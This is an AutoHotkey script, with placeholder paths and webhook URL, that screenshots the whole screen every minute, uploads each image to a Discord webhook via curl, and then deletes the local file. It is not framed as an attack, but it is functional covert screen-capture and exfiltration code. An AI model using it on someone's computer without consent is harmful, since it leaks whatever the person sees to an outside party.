#Persistent
SetTimer, SendScreenshotToDiscord, 60000  ; Set the timer to run (time is in ms)
Return

SendScreenshotToDiscord:
{
    ScreenshotFile := "insert your path here"  ; Set the path for saving the screenshot

    if (CaptureScreen(ScreenshotFile)) {
    } else {
        return  
    }

    WebhookURL := "https://discord.com/api/webhooks/your_webhook_url_here"  ; Your webhook URL
    RunWait, % "C:\curl\curl.exe -F ""file=@" ScreenshotFile """ """ WebhookURL """", , OutputVar

    FileAppend, % A_Now ": " OutputVar "`n", C:\Logs\curl_output.log 

    FileDelete, %ScreenshotFile%
}
Return

CaptureScreen(FilePath) {
    pToken := Gdip_Startup()
    pBitmap := Gdip_BitmapFromScreen()
    Gdip_SaveBitmapToFile(pBitmap, FilePath)
    Gdip_DisposeImage(pBitmap)
    Gdip_Shutdown(pToken)
    return true  ; Indicate success
}

#Include Gdip_All.ahk